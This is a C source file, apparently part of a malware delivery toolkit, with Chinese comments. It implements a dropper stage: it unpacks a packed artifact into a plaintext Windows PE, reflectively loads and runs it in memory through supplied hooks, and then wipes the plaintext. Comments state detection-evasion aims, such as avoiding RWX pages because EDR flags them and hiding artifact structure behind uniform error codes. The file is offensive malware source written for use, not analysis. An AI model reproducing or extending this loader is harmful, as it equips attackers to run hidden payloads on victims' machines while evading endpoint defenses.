/*
 * 25_deploy/src/drop_pe.c
 *
 * 投送侧 PE 载荷路径：制品 -> 明文 PE -> 反射装载 -> 执行 -> 明文擦除。
 * 详见 include/drop_pe.h 的分工说明。
 */

#include "drop_pe.h"
#include "packer.h"

#include <string.h>
#include <stdlib.h>

int dp_asm_unpack_pe(const dp_asm_t *a, const uint8_t *seed, size_t seed_len,
                     uint8_t *out, size_t *io_cap, dp_pe_info_t *info)
{
    pe_image_t img;
    size_t     cap;
    size_t     raw_len = 0;
    int        rc;

    if (!a || !seed || !out || !io_cap) return DP_ERR_ARG;
    if (!a->sealed) return DP_ERR_INCOMPLETE;
    if (!a->buf || a->len == 0) return DP_ERR_ARG;
    if (*io_cap == 0) return DP_ERR_ARG;

    cap = *io_cap;

    /*
     * 解包缓冲按"制品长度"推算必然不足：制品是压缩的，明文恒大于制品，
     * 且比例未知（实测约 1.9）。pk_size_bound_v4 是打包上界不是解包上界。
     * 故从调用方给的容量起翻倍重试，直到不再是 NOMEM。
     */
    rc = PK_ERR_NOMEM;
    for (int attempt = 0; attempt < 8; attempt++) {
        raw_len = cap;
        rc = pk_unpack_shaped(a->buf, a->len, seed, seed_len, out, &raw_len);
        if (rc == PK_OK) break;
        if (rc != PK_ERR_NOMEM) {
            /* 非容量问题：重试无意义。统一对外报 DIGEST，不泄露制品内部结构 */
            return DP_ERR_DIGEST;
        }
        if (cap > ((size_t)1 << 31)) return DP_ERR_NOMEM;
        cap *= 2u;
        if (cap > *io_cap) {
            /* 调用方缓冲不够大：把需要的容量报回去，让它重新分配 */
            *io_cap = cap;
            return DP_ERR_NOMEM;
        }
    }
    if (rc != PK_OK) return DP_ERR_DIGEST;

    *io_cap = raw_len;

    /*
     * 必须先确认这是 PE 再让调用方去分配 region。
     * 若跳过这一步，非 PE 内容会被当成映像映射，失败点落在 reflect_load
     * 内部，而此时明文已经躺在内存里了。
     */
    if (pe_parse(out, raw_len, &img) != 0) return DP_ERR_PE;

    if (info) {
        memset(info, 0, sizeof(*info));
        info->raw_len     = raw_len;
        info->region_need = (size_t)pe_virtual_size(&img);
        info->machine     = img.machine;
        info->is_dll      = (img.chars & 0x2000u) ? 1 : 0;
    }
    return DP_OK;
}

int dp_pe_run(const uint8_t *pe, size_t pe_len,
              uint8_t *region, size_t region_size,
              const rr_hooks_t *rh, dp_pe_result_t *out)
{
    pe_image_t   img;
    rr_result_t  rr;
    int          rc;

    if (out) memset(out, 0, sizeof(*out));

    if (!pe || pe_len == 0 || !region || region_size == 0 || !rh) return DP_ERR_ARG;

    /*
     * 三个回调任一缺失都拒绝执行。绝不"默认 RWX 继续跑"：RWX 页是 EDR 的
     * 强特征，静默降级等于把"能跑起来"置于"不被发现"之上。
     */
    if (!rh->protect || !rh->call || !rh->resolve) return DP_ERR_NOHOOK;

    if (pe_parse(pe, pe_len, &img) != 0) return DP_ERR_PE;

    if (region_size < (size_t)pe_virtual_size(&img)) return DP_ERR_REGION;

    memset(&rr, 0, sizeof(rr));
    rc = rr_load_run(pe, pe_len, region, region_size, rh, &rr);

    if (out) {
        out->n_reloc       = rr.n_reloc;
        out->n_import      = rr.n_import;
        out->n_sections    = rr.n_sections_prot;
        out->n_tls         = rr.n_tls;
        out->is_dll        = rr.is_dll;
        out->entry_invoked = rr.entry_invoked;
        out->reflect_rc    = rc;
    }
    return (rc == RR_OK) ? DP_OK : rc;
}

void dp_pe_scrub(uint8_t *buf, size_t len)
{
    if (buf && len) memset(buf, 0, len);
}

const char *dp_pe_errstr(int rc)
{
    switch (rc) {
    case DP_OK:             return "DP_OK";
    case DP_ERR_ARG:        return "DP_ERR_ARG";
    case DP_ERR_NOMEM:      return "DP_ERR_NOMEM";
    case DP_ERR_INCOMPLETE: return "DP_ERR_INCOMPLETE";
    case DP_ERR_DIGEST:     return "DP_ERR_DIGEST";
    case DP_ERR_PE:         return "DP_ERR_PE";
    case DP_ERR_REGION:     return "DP_ERR_REGION";
    case DP_ERR_NOHOOK:     return "DP_ERR_NOHOOK";
    default:                return "DP_ERR_UNKNOWN";
    }
}
